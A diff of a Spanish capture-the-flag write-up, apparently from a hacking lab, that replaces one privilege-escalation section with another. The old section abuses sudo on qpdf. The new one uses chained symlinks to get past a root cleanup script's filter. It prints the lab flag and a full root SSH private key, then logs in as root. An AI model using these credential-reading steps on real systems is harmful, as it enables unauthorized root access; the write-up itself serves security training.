@@ -498,53 +498,144 @@ consuela
 
 ## Escalada de privilegios
 
-Ejecutando **sudo -l**, pude ver que puedo ejecutar el script /usr/bin/qpdf como root sin necesidad de proporcionar contraseña.
+Ejecutando **sudo -l**, pude ver que puedo ejecutar el script /opt/ghost/clean_symlink.sh como root sin necesidad de proporcionar contraseña.
 
 ```bash
-consuela@iclean:/tmp$ sudo -l
-Matching Defaults entries for consuela on iclean:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+bob@linkvortex:~$ sudo -l
+Matching Defaults entries for bob on linkvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT
 
-User consuela may run the following commands on iclean:
-    (ALL) /usr/bin/qpdf
+User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+bob@linkvortex:~$ 
 ```
 
-Después de revisar la documentación de la herramienta, descubrí que es posible generar un archivo duplicando el contenido de uno existente. Por lo tanto, incluí la clave SSH de root como parámetro para obtenerla al generar el archivo y poder conectarme mediante ssh.
+El contenido del archivo **clean_symlink.sh** es el siguiente:
 
 ```bash
-consuela@iclean:/tmp$ sudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa
+#!/bin/bash
+
+QUAR_DIR="/var/quarantined"
+
+if [ -z $CHECK_CONTENT ];then
+  CHECK_CONTENT=false
+fi
+
+LINK=$1
+
+if ! [[ "$LINK" =~ \.png$ ]]; then
+  /usr/bin/echo "! First argument must be a png file !"
+  exit 2
+fi
+
+if /usr/bin/sudo /usr/bin/test -L $LINK;then
+  LINK_NAME=$(/usr/bin/basename $LINK)
+  LINK_TARGET=$(/usr/bin/readlink $LINK)
+  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
+    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
+    /usr/bin/unlink $LINK
+  else
+    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
+    /usr/bin/mv $LINK $QUAR_DIR/
+    if $CHECK_CONTENT;then
+      /usr/bin/echo "Content:"
+      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
+    fi
+  fi
+fi
 ```
 
+El script estaba diseñado para mover a una carpeta de cuarentena (`/var/quarantined`) cualquier **enlace simbólico que terminara en `.png`**. Si la variable `CHECK_CONTENT=true` estaba activada, el script mostraba el contenido del archivo al que apuntaba el symlink. Sin embargo, si el enlace apuntaba a una ruta que incluyera las palabras **`etc`** o **`root`**, este era eliminado automáticamente por considerarse peligroso.
+
+Para lograr engañarlo y hacer que muestre el contenido de **/root/root.txt**  seguí los siguientes pasos:
+
+1. Cree un enlace simbólico con terminación .png que apunte a /root/root.txt: **ln -s /root/root.txt /tmp/safe/data.txt **
+2. Cree otro enlace simbólico que apunte a mi enlace simbólico anterior de este modo cuando el script revisa `readlink` y busca `etc|root` en el contenido al no encontrarlo lo toma como bueno: **ln -s /tmp/safe/data.txt p3rr1n.png** 
+
+`readlink final.png` devuelve `/tmp/safe/data.txt` → no contiene ni "root" ni "etc" pero al seguirlo se accede a `/root/root.txt`
+
 ```bash
-┌──(root㉿kali)-[/home/kali]
-└─# ssh -i id_rsa root@10.10.11.12 
-Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+bob@linkvortex:/tmp$ mkdir /tmp/safe
+bob@linkvortex:/tmp$ ln -s /root/root.txt /tmp/safe/data.txt
+
+bob@linkvortex:/tmp/safe$ CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh p3rr1n.png 
+Link found [ p3rr1n.png ] , moving it to quarantine
+Content:
+4424ac02f0e3ad99bc61a18f2afb0a95
+bob@linkvortex:/tmp/safe$ 
+```
+
+Veo que funciono, para obtener una shell como root seguí el mismo procedimiento pero apuntando a **/root/.ssh/id_rsa**
+
+```bash
+bob@linkvortex:/tmp$ rm -r safe/
+bob@linkvortex:/tmp$ mkdir /tmp/safe
+bob@linkvortex:/tmp$ ln -s /root/.ssh/id_rsa /tmp/safe/data.txt
+bob@linkvortex:/tmp$ ln -s /tmp/safe/data.txt p3rr1n.png
+bob@linkvortex:/tmp$ CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh p3rr1n.png
+Link found [ p3rr1n.png ] , moving it to quarantine
+Content:
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+bob@linkvortex:/tmp$ 
+```
+
+Finalmente inicie sesión mediante ssh con la lave de root
+
+```bash
+┌──(root㉿kali)-[/opt/git-dumper/linkvortex]
+└─# ssh -i id_rsa root@10.10.11.47    
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/pro
 
-  System information as of Tue Jul  2 12:05:32 AM UTC 2024
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
 
-
-
-
-Expanded Security Maintenance for Applications is not enabled.
-
-3 updates can be applied immediately.
-To see these additional updates run: apt list --upgradable
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
+To restore this content, you can run the 'unminimize' command.
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
-
-root@iclean:~# whoami
+Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
+root@linkvortex:~# whoami
 root
-root@iclean:~# 
+root@linkvortex:~# 
 ```
 
